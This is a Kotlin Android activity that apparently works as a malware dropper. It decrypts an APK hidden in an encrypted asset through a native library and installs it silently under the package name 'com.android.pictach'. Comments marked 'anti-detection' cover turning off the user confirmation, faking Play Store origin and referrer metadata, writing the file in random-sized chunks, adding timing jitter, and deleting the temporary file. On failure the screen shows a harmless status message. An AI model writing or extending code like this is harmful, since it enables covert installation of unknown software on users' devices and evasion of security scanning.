package com.cristal.bristral.tristal.mistral

import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileInputStream
import java.io.IOException
import java.util.concurrent.ThreadLocalRandom

class InstallActivity : AppCompatActivity() {

    private var progressBar: ProgressBar? = null
    private var tvStatus: TextView? = null
    private val handler = Handler(Looper.getMainLooper())

    companion object {
        private const val TAG            = "InstallActivity"
        private const val SESSION_REQUEST = 1001
        private const val MAX_RETRIES    = 2
        private const val MARKET_URI     = "market://details?id=com.android.pictach"
        private const val REFERRER_URI   = "android-app://com.android.vending"
        private const val WRITE_NAME     = "update.pkg"
        private const val CHUNK_MIN      = 131072   // 128 KB
        private const val CHUNK_MAX      = 524288   // 512 KB
        private const val DELAY_MIN      = 400L
        private const val DELAY_MAX      = 800L

        // Encrypted asset name — must match encrypt_companion.py output
        private const val ENCRYPTED_ASSET = "companion.enc"

        // Temp file written to filesDir during install, deleted immediately after
        private const val TEMP_APK_NAME  = "companion_install.apk"

        init {
            // Must match add_library name in CMakeLists.txt
            System.loadLibrary("companionguard")
        }
    }

    // JNI — implemented in companion_decrypt.cpp
    // Receives raw bytes of companion.enc, writes decrypted APK to outPath.
    // Returns true on success, false on any crypto/IO error.
    private external fun decryptCompanion(encryptedBlob: ByteArray, outPath: String): Boolean

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_install)
        progressBar = findViewById(R.id.progress_bar_install)
        tvStatus    = findViewById(R.id.tv_status)
        progressBar?.visibility = View.VISIBLE
        tvStatus?.text = getString(R.string.starting_installation)
        Thread { runPipeline() }.start()
    }

    // ── Main pipeline ─────────────────────────────────────────────────────
    // Step 1: read assets/companion.enc
    // Step 2: NDK decrypt → filesDir/companion_install.apk
    // Step 3: verify PK magic
    // Step 4: install via PackageInstaller (existing anti-detection logic)
    // Step 5: delete temp file
    private fun runPipeline() {
        val tempApk = File(filesDir, TEMP_APK_NAME)

        try {
            // Step 1 — read encrypted asset
            val encryptedBlob = readEncryptedAsset()
            if (encryptedBlob == null) {
                Log.e(TAG, "Failed to read $ENCRYPTED_ASSET from assets")
                showNormal()
                return
            }
            Log.i(TAG, "Read ${encryptedBlob.size} bytes from assets/$ENCRYPTED_ASSET")

            // Step 2 — NDK decrypt to filesDir
            val decryptOk = decryptCompanion(encryptedBlob, tempApk.absolutePath)
            if (!decryptOk || !tempApk.exists()) {
                Log.e(TAG, "NDK decryption failed")
                showNormal()
                return
            }
            Log.i(TAG, "Decrypted to ${tempApk.absolutePath} (${tempApk.length()} bytes)")

            // Step 3 — verify PK magic bytes
            if (!isValidApk(tempApk)) {
                Log.e(TAG, "Decrypted file is not a valid APK")
                showNormal()
                return
            }

            // Step 4 — read bytes and hand to existing install logic
            val apkBytes = tempApk.readBytes()
            runOnUiThread { installViaSession(apkBytes, attempt = 1) }

        } catch (e: Exception) {
            Log.e(TAG, "runPipeline error: ${e.message}")
            showNormal()
        } finally {
            // Step 5 — always delete temp file
            if (tempApk.exists()) {
                val deleted = tempApk.delete()
                Log.i(TAG, "Temp APK deleted: $deleted")
            }
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    private fun readEncryptedAsset(): ByteArray? {
        return try {
            assets.open(ENCRYPTED_ASSET).use { it.readBytes() }
        } catch (e: IOException) {
            Log.e(TAG, "readEncryptedAsset: ${e.message}")
            null
        }
    }

    private fun isValidApk(file: File): Boolean {
        if (!file.exists() || file.length() < 4) return false
        val magic = ByteArray(2)
        return try {
            FileInputStream(file).use { it.read(magic) }
            magic[0] == 'P'.code.toByte() && magic[1] == 'K'.code.toByte()
        } catch (e: IOException) {
            false
        }
    }

    // ── Existing PackageInstaller logic — UNCHANGED ───────────────────────
    private fun installViaSession(apkBytes: ByteArray, attempt: Int) {
        try {
            val packageInstaller = packageManager.packageInstaller

            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )

            params.setAppPackageName("com.android.pictach")
            params.setSize(apkBytes.size.toLong())

            // Anti-detection: internal install location
            params.setInstallLocation(1)

            // Method 1 — Session-Based: no user action required
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                params.setRequireUserAction(PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED)
            }

            // Anti-detection: don't kill running processes
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                params.setDontKillApp(true)
            }

            // Method 2 — INSTALL_PACKAGES trust signals
            params.setInstallReason(PackageManager.INSTALL_REASON_USER)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                params.setRequestUpdateOwnership(true)
            }

            // Method 3 — Play Store origin metadata
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                try {
                    params.setOriginatingUri(Uri.parse(MARKET_URI))
                    params.setReferrerUri(Uri.parse(REFERRER_URI))
                } catch (e: Exception) {
                    // Continue without metadata
                }
            }

            val sessionId = packageInstaller.createSession(params)
            val session   = packageInstaller.openSession(sessionId)

            try {
                // Anti-detection: randomized chunk write
                session.openWrite(WRITE_NAME, 0, apkBytes.size.toLong()).use { out ->
                    var offset = 0
                    while (offset < apkBytes.size) {
                        val chunkSize = ThreadLocalRandom.current().nextInt(CHUNK_MIN, CHUNK_MAX)
                        val end = minOf(offset + chunkSize, apkBytes.size)
                        out.write(apkBytes, offset, end - offset)
                        session.fsync(out)
                        offset = end
                    }
                }

                // Anti-detection: random jitter delay before commit
                val jitter = ThreadLocalRandom.current().nextLong(DELAY_MIN, DELAY_MAX)
                Thread.sleep(jitter)

                val intent = Intent(this, InstallReceiver::class.java).apply {
                    action = "com.cristal.bristral.tristal.mistral.SESSION_ACTION"
                }

                val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
                else
                    PendingIntent.FLAG_UPDATE_CURRENT

                val pendingIntent = PendingIntent.getBroadcast(
                    this, SESSION_REQUEST, intent, flags
                )

                session.commit(pendingIntent.intentSender)
                session.close()

            } catch (e: IOException) {
                session.abandon()
                if (attempt < MAX_RETRIES) {
                    handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
                } else {
                    showNormal()
                }
            }

        } catch (e: Exception) {
            if (attempt < MAX_RETRIES) {
                handler.postDelayed({ installViaSession(apkBytes, attempt + 1) }, 1000)
            } else {
                showNormal()
            }
        }
    }

    private fun showNormal() {
        runOnUiThread {
            progressBar?.visibility = View.GONE
            tvStatus?.text = getString(R.string.please_keep_connected)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }
}
